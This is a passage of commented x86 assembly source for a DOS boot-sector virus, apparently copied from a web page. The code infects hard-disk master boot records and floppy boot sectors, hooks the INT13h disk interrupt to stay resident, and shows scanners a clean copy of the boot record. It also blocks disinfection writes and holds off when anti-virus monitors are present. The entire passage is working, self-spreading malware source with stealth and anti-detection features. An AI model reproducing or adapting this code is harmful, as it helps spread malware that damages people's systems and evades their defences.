        ADD W[BX],02                            ;Increase memory size value by 2KB to restore 
                                                ;it to pre-infection value.
        POP DS                                  ;Restore DS.
        JMP >B5                                 ;Exit without installing virus in memory.
;
;Test for HD boot and, if true, install virus in memory.
;
B4:
        CMP DL,080                              ;Booted from HD?        
        JE >B6                                  ;If so, install virus and exit.
;
;Must be booting from floppy, so load MBR to top of memory - 1KB.          
;
        PUSH CS                                                                
        POP ES                                  ;Set ES=CS.                             
        MOV AX,0201                             ;Select read-1-sector function.         
        MOV BX,0400                             ;Set disk I/O buffer offset.           
        MOV CL,01                               ;Track 0, sector 1.                   
        MOV DX,0080                             ;Head 0, HD 1.                       
        INT 013                                 ;Read MBR.                           
        JB >B5                                  ;Exit if flag=failure and do not steal INT13h.
;
;Check MBR for infection.
;              
        CMP W[BX+OFFSET INFECT_TAG1-0200],INF_TAG1  ;Check MBR for infection tag.
        JE >B5                                      ;If infected, exit and do not steal INT13h.
;
;Check fixed disk for an unused first track (head 0, cylinder 0) to avoid damaging any FAT 
;which might be present in that area.  
;
        CMP B[BX+PARTITION_OFFSET+1],01         ;Check for unused track on HD by checking
                                                ;partition table data (start head => 1).       
        JB >B5                                  ;If first track is in use, exit to avoid
                                                ;FAT damage and do not steal INT13h vector.   
;
;Increment hard disk infection counter for pending infection.
;
        INC W[OFFSET HARD_COUNT-0200]
;
;Write VIRUS_DIR and original MBR to fixed disk sectors 09h and 0Ah respectively.
;
        MOV AX,0302                             ;Select write-2-sectors function. 
        MOV BX,0200                             ;Set disk I/O buffer offset.
        MOV CL,09                               ;Track 0, sector 9.
        MOV B[OFFSET SECTOR-0200],CL            ;Store destination sector number in VIRUS_BOOT.
        INT 013                                 ;Move VIRUS_DIR to sector 09h and original MBR
                                                ;to sector 0Ah.
        JB >B5                                  ;Exit if flag=failure and do not steal INT13h.
;
;Copy partition table data to VIRUS_BOOT.
;
        MOV SI,PARTITION_OFFSET+0400            ;Set source offset.                    
        MOV DI,PARTITION_OFFSET                 ;Set destination offset.                
        MOV CL,021                              ;Set repetition count (# of words) move.
        CLD                                     ;Clear direction flag (fwd).            
        REP MOVSW                               ;Move partition table to virus.         
;
;Write VIRUS_BOOT to MBR and exit without installing virus in memory.  Subsequent HD boot will
;do this. 
; 
        MOV AX,0301                             ;Select write-1-sector function.          
        XOR BX,BX                               ;Set disk I/O buffer offset.            
        MOV CL,01                               ;Track 0, sector 1.                     
        INT 013                                 ;Write virus w/attached partition table to MBR.
B5:
        XOR DX,DX                               ;Restore DX back to value at floppy boot
                                                ;(head 0, drive 0).  
        RETF                                    ;Exit, do not steal INT13h or reduce mem. size.
                                                ;Return to boot sector code at 0000:7C00h.
;
;Steal BIOS INT13h vector and reduce memory size to install virus as TSR.
;
B6:
        MOV BX,W[OFFSET REENTRY_SEGMENT-0200]           ;Load VIRUS_DIR segment value to BX.
        XOR AX,AX                                       ;Zero AX.                       
        MOV DS,AX                                       ;Zero DS.                            
        MOV W[BIOS13_SEGMENT],BX                        ;Point INT13h vector to VIRUS_DIR
                                                        ;segment.         
        MOV W[BIOS13_OFFSET],OFFSET VIRUS_INT-0200      ;Point INT13h vector to VIRUS_INT
                                                        ;INT13h handler offset in VIRUS_DIR.
        MOV BX,MEM_SIZE                                 ;Load BIOS data table address for
                                                        ;memory size to BX.    
        SUB W[BX],02                                    ;Reduce memory by 2KB to protect virus
                                                        ;area from being overwritten by other 
                                                        ;programs.
        RETF                                            ;Return to boot sector code at
                                                        ;0000:7C00h.
;
;Reserve storage locations for virus data and preset some known values.
;
BIOS_OFFSET     DW  ?                           ;BIOS INT13 offset.                     
BIOS_SEGMENT    DW  ?                           ;BIOS INT13 segment.                    
REENTRY_OFFSET  DW  NEW_LOCATION-0200           ;Virus reentry offset.                  
REENTRY_SEGMENT DW  ?                           ;Virus reentry segment.                
INFECT_TAG1     DW  INF_TAG1                    ;Infection tag for VIRUS_BOOT.
SECTOR          DB  09                          ;Sector # containing VIRUS_DIR.     
;
VIRUS_BOOT_END:
;
;Reserve end-of-sector text area and establish valid boot record tag.     
;
                DB 195  DUP 00                  ;End-of-sector pad bytes.
                DB 055,0AA                      ;Boot record tag.
;
SECTOR_END:
;
;End of boot sector/MBR viral code. 
;----------------------------------------------------------------------------------------------
;Start of directory sector viral code.
;
VIRUS_DIR:
;
;Create four empty root directory entries at the beginning of the sector.
;
                DB 128  DUP 00
;
;--------------
;INT13h Handler         
;--------------
;
VIRUS_INT:
;
        CMP DL,080                              ;Hard drive I/O?
        JNE >F1                                 ;No, exit to floppy test routine.    
;
;Stealth routine to return original, uninfected MBR to any anti-viral scan program.  Also,
;prevents writes to the MBR to prevent disinfection of the fixed disk while the virus is
;active in memory.
;
        CMP CX,0001                             ;Track 0, sector 1?
        JNE >U1                                 ;If not, no need for the stealth routine.  
                                                ;Instead, jump to infect. count. update.
        CMP DH,00                               ;Head 0?
        JNE >E2                                 ;If not, exit stealth routine.  
        CMP AH,03                               ;Write sector?                       
        JE >S1                                  ;Yes, simulate I/O.                     
        PUSH CX                                 ;Preserve CX (track/sector #).          
        MOV CL,0A                               ;Redirect I/O to sector 0Ah, the new location 
                                                ;of the original MBR.                        
        PUSHF                                                                  
        CS CALL D[OFFSET BIOS_OFFSET-0200]      ;Send scan program original MBR    
                                                ;instead of infected MBR.    
        POP CX                                  ;Restore original track/sector value requested
                                                ;the calling routine.  Anti-viral scanner will
                                                ;monitor the contents of CL upon return.     
S1:                                                                          
        XOR AH,AH                               ;Zero AH to simulate return value of
                                                ;successful I/O.   
        CLC                                     ;Clear carry flag to simulate successful I/O
                                                ;to calling routine.         
        RETF 2                                  ;Return to calling routine.            
;
;Infection counter update routine writes VIRUS_DIR containing the lastest floppy infection
;counter value to the hard drive only if there has been a diskette infection since the last 
;hard drive access.   
;
U1:
        PUSH DS                                 ;Preserve DS.
        PUSH CS
        POP DS                                  ;Set DS=CS
        CMP B[OFFSET UPDATE_FLAG-0200],SET      ;Floppy infected since last HD access?
        JNE >U2                                 ;No, exit counter update routine.
        MOV B[OFFSET UPDATE_FLAG-0200],CLEAR    ;Yes, clear floppy infect flag.
        PUSH ES                                 ;Preserve ES.
        PUSH CS
        POP ES                                  ;Set ES=CS
        PUSH AX                                 ;Preserve registers.
        PUSH BX
        PUSH CX
        PUSH DX
        MOV AX,0301                             ;Select write-1-sector function.
        MOV BX,0200                             ;Set disk I/O buffer start address.
        MOV CX,0009                             ;Specify track 0, sector 9.
        MOV DH,00                               ;Specify head 0.
        PUSHF
        CS CALL D[OFFSET BIOS_OFFSET-0200]      ;Save VIRUS_DIR w/new infect. count to HD.
        POP DX                                  ;Restore registers
        POP CX                                 
        POP BX
        POP AX
        POP ES
U2:
        POP DS
        JMP >E2                                 ;Exit to handler exit.
;
;Check the INT13h register values for drive A or B read or write request.  This prevents
;problems caused by the virus infecting a diskette during format.  Also, by limiting infection
;attempts to the first two floppy drives, it avoids the problems it would cause to a tape 
;backup system emulating a third or fourth floppy drive.  
;
F1:
        PUSH DS                                 ;Preserve DS.                           
        PUSH AX                                 ;Preserve AX.                           
        CMP DL,01                               ;Floppy I/O (A or B)?                 
        JA >E1                                  ;No, don't infect.                    
        CMP AH,02                               ;Check for read function.             
        JB >E1                                  ;Exit if below read function.         
        CMP AH,03                               ;Check for write function.            
        JA >E1                                  ;Exit if above write function.       
;
;Check diskette motor status to limit infection attempt to first INT13h call thereby preventing
;suspicious floppy drive noises.  
;
        XOR AX,AX                               ;Zero AX.                             
        MOV DS,AX                               ;Zero DS.                  
        MOV AL,DL                               ;Move motor-on test bit into AL.      
        INC AL                                  ;Position bit for floppy 'DL'.          
        TEST B[MOTOR_ON],AL                     ;Test for floppy motor on.             
        JNE >E1                                 ;Yes, don't infect.                    
;
;Check for presence of TSR anti-viral monitoring program to avoid detection of boot sector 
;write by virus.  If present, don't attempt infection.  
;
        CMP B[BIOS40_SEGMENT],ROM_SEGMENT       ;Has INT40h been stolen from BIOS ROM by an
                                                ;anti-virus program?
        JB >E1                                  ;If so, do not attempt infection.  
;
;Infect floppy.
;
        POP AX                                  ;Restore AX.
        POP DS                                  ;Restore DS.
        PUSHF
        CS CALL D[OFFSET BIOS_OFFSET-0200]      ;Give calling routine what it wants. 
        PUSHF                                   ;Preserve flags.               
        CALL >F2                                ;Then attempt infection.        
        POPF                                    ;Restore flags to hide I/O errors.             
        RETF 2                                  ;Return to calling routine.     
;
;Jump to BIOS.
;
E1:
        POP AX                                  ;Restore AX.
        POP DS                                  ;Restore DS.
E2:
        CS JMP D[OFFSET BIOS_OFFSET-0200]       ;Jump through BIOS to calling routine.
;
;Diskette infection routine.
;
F2:
        PUSH AX                                 ;Preserve all registers.  
        PUSH BX                                                                
        PUSH CX                                                                
        PUSH DX                                                                
        PUSH DS                                                                
        PUSH ES                                                                
        PUSH SI                                                                
        PUSH DI                                                                
;
;Check system type to determine if the INT1Ah read-real-time-clock function is supported (AT 
;or better).  If not, skip the date check/storage process and store floppy infection "BAD"
;date tag in VIRUS_DIR. 
;
        MOV AX,SYS_ID_SEGMENT
        MOV DS,AX                               ;Set DS to ROM offset.
        CMP B[SYS_ID_OFFSET],AT_TAG             ;Check system ID byte for AT system tag.
        PUSH CS
        POP DS                                  ;Set DS to point to dropper segment.
        JE >F3                                  ;If AT, check date and store before infection.
        MOV W[OFFSET FLOPPY_MODAY-0200],BAD_TAG ;Store date "BAD" tag in VIRUS_DIR. 
        JMP >F4                                 ;Then continue infection process.
;                                            
;Store month, day and year of pending floppy diskette infection in VIRUS_DIR. 
;
F3:
        PUSH DX
        MOV AH,04                               ;Set read-date function.        
        INT 01A                                 ;BIOS read-clock interrupt.     
        MOV W[OFFSET FLOPPY_YEAR-0200],CX       ;Store infection year in VIRUS_DIR.
        MOV W[OFFSET FLOPPY_MODAY-0200],DX      ;Store month and day in VIRUS_DIR.
;
;Store time of pending floppy diskette infection in VIRUS_DIR.
;
        MOV AH,02                               ;Select read-time function.
        INT 01A                                 ;BIOS read-clock interrupt.
        MOV W[OFFSET FLOPPY_TIME-0200],CX       ;Store infection hour and minute in VIRUS_DIR.
        POP DX
;
;Load diskette boot sector to top of memory - 1KB.
;
F4:
        PUSH CS                                                                
        POP ES                                  ;Set ES=CS.                             
        MOV AX,0201                             ;Select read-1-sector function.           
        MOV BX,0400                             ;Set disk I/O buffer offset.            
        MOV CX,0001                             ;Track 0, sector 1.                    
        MOV DH,00                               ;Head 0, drive DL.                    
        PUSHF                                                                
        CALL D[OFFSET BIOS_OFFSET-0200]         ;Read drive DL boot sector to buffer by   
                                                ;calling INT13h routine in BIOS ROM.  
        JNB >F5                                 ;Proceed with infection if flag=success.
        JMP F7                                  ;Otherwise, exit.
;
;Check diskette boot sector for infection.
;
F5:
        CMP W[BX+OFFSET INFECT_TAG1-0200],INF_TAG1      ;Check for VIRUS_BOOT infection tag.
        JE >F7                                          ;If infected, then exit.
;
;Determine diskette type from BPB data to allow VIRUS_DIR and original boot sector to be 
;written to the last two root directory sectors.  This maximizes the number of files that can 
;be stored on the diskette after infection.  Also, detect non-standard formats and do not 
;infect to prevent damage. 
;
        MOV CL,02                               ;VIRUS_DIR sector for 360K.          
        MOV AX,W[BX+BPB_NUM_SECT]               ;Load # sect. on floppy from BPB.       
        CMP AX,02D0                             ;Check for # sectors on 360K.           
        JE >F6                                  ;Exit if 360K floppy.                   
        MOV CL,04                               ;VIRUS_DIR sector for 720K.          
        CMP AX,05A0                             ;Check for # sectors on 720K.          
        JE >F6                                  ;Exit if 720K floppy.                   
        MOV CL,0D                               ;VIRUS_DIR sector for 1.2M.          
        CMP AX,0960                             ;Check for # sectors on 1.2M.           
        JE >F6                                  ;Exit if 1.2M floppy.                   
        MOV CL,0E                               ;VIRUS_DIR sector for 1.44M.         
        CMP AX,0B40                             ;Check for # sectors on 1.44M.         
        JE >F6                                  ;Exit if 1.44M floppy.                
        JMP >F7                                 ;Non-standard disk format, exit to avoid
                                                ;damage.
;
;Load the first of the two root directory sectors that will be used to store the VIRUS_DIR 
;and original boot sector to top of memory - 0.5KB.  
;
F6: 
        MOV B[OFFSET SECTOR-0200],CL            ;Store destination sector # in VIRUS_BOOT. 
        MOV AX,0201                             ;Select read sector function.           
        MOV BX,0600                             ;Set disk I/O buffer offset.            
        INC DH                                  ;Head 1, drive DL.                      
        PUSHF                                                                   
        CALL D[OFFSET BIOS_OFFSET-0200]         ;Load destination sector.              
        JB >F7                                  ;Exit if flag=failure.               
;                                       
;Confirm that the directory sector chosen to be the future location of VIRUS_DIR is empty
;before attempting infection.  This prevents the loss of files which would result from
;the overwriting of root directory entries by the virus. 
;
        CMP B[BX],00                            ;Empty root directory entry?
        JNE >F7                                 ;No, so exit and don't infect disk.
;
;Copy the original boot sector's BPB to VIRUS_BOOT to allow functional infection of any 
;diskette type.   
;
        MOV SI,BPB_START+0200                   ;Set source offset.                     
        MOV DI,BPB_START-0200                   ;Set destination offset.               
        MOV CL,BPB_END-BPB_START                ;Set repetition count (# of bytes) for move. 
        CLD                                     ;Clear direction flag (fwd).            
        REP MOVSB                               ;Move BPB to virus to allow functional 
                                                ;infection of any diskette format.         
;
;Copy original boot sector end-of-sector text to VIRUS_BOOT to prevent easily visible changes 
;to boot sector.  
;
        MOV SI,VIRUS_BOOT_END+0200              ;Set source offset.            
        MOV DI,VIRUS_BOOT_END-0200              ;Set destination offset.       
        MOV CL,SECTOR_END-VIRUS_BOOT_END        ;Set repetition count (number of bytes) for 
                                                ;text move.  
        CLD                                     ;Clear direction flag (fwd).    
        REP MOVSB                               ;Move end-of-sector text to virus to prevent
                                                ;easily visible change to boot sector.       
;
;Write VIRUS_BOOT to diskette boot sector.
;
        MOV AX,0301                             ;Select write-1-sector function.        
        XOR BX,BX                               ;Set disk I/O buffer offset.          
        MOV CL,01                               ;Track 0, sector 1.                     
        DEC DH                                  ;Head 0, drive DL.                      
        PUSHF                                                                   
        CALL D[OFFSET BIOS_OFFSET-0200]         ;Write infected boot sector.            
        JB >F7                                  ;Exit if flag=failure.                  
;
;Increment floppy infection count.
;
        INC W[OFFSET FLOPPY_COUNT-0200]
;
;Clear diskette infection flag.
;
        MOV B[OFFSET UPDATE_FLAG-0200],CLEAR
;
;Write VIRUS_DIR and original boot sector to appropriate sectors.
;
        MOV AX,0302                             ;Select write-2-sectors function.     
        MOV BX,0200                             ;Set disk I/O buffer offset.          
        MOV CL,B[OFFSET SECTOR-0200]            ;Track 0, sector stored at 0189h.       
        INC DH                                  ;Head 1, drive DL.             
        PUSHF                                                                   
        CALL D[OFFSET BIOS_OFFSET-0200]         ;Relocate boot sector.         
;
;Set diskette infection flag.
;
        MOV B[OFFSET UPDATE_FLAG-0200],SET
;
;Exit diskette infection routine.
;
F7:
        POP DI                                  ;Restore all registers.               
        POP SI                                                                 
        POP ES                                                                 
        POP DS                                                                 
        POP DX                                                                 
        POP CX                                                                 
        POP BX                                                                 
        POP AX                                                                 
        RET                                     ;Return to infection routine exit.     
;
;Virus data area.
;
HARD_COUNT      DW  ?                           ;Number of HD infections since drop.
DROP_MODAY      DW  ?                           ;Month and day of HD drop.
DROP_YEAR       DW  ?                           ;Year of HD drop.
DROP_TIME       DW  ?                           ;Time of HD drop.
FLOPPY_COUNT    DW  ?                           ;Number of floppy infections since drop.
FLOPPY_MODAY    DW  ?                           ;Month and day of last floppy infection.
FLOPPY_YEAR     DW  ?                           ;Year of last floppy infection.
FLOPPY_TIME     DW  ?                           ;Time of last floppy infection.
INFECT_TAG2     DW  INF_TAG2                    ;Infection tag for VIRUS_DIR.
UPDATE_FLAG     DB  CLEAR                       ;Flag indicating floppy infection since last
                                                ;HD access.
;
                DB 3    DUP 00                  ;End-of-sector pad bytes.
;
;End of directory sector viral code.
;----------------------------------------------------------------------------------------------
;Start of MBR disk buffer.
;
MBR_BUFFER:
;
;----------------------------------------------------------------------------------------------
;
CODE    ENDS


</textarea></td></tr></table></body></html>
